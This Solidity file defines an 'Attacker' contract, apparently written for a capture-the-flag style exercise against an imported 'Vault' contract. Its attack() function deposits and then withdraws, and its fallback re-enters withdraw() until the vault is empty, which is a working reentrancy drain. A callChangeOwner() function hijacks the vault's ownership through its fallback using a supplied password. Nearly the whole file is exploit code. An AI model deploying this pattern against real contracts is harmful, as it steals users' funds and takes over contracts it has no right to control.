// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Script, console} from "forge-std/Script.sol";

contract Attacker is Ownable {
    address payable vaultAddress;

    constructor(address targetAddress_, address owner_) Ownable(owner_) {
        vaultAddress = payable(targetAddress_);
    }

    fallback() external payable {
        if (address(vaultAddress).balance > 0 ether) {
            Vault(vaultAddress).withdraw();
        }
    }

    function attack() external payable onlyOwner {
        uint256 amount = msg.value;
        require(amount > 0, "amount must gt 0");

        Vault(vaultAddress).deposite{value: amount}();

        Vault(vaultAddress).withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function callChangeOwner(bytes32 _password, address newOwner) public {
        // 构造调用数据
        console.log("callChangeOwner:");
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", _password, newOwner);

        // 通过Vault合约的fallback函数调用
        (bool success,) = vaultAddress.call(data);
        console.log("success:", success);
        require(success, "Call to Vault failed");
    }
}
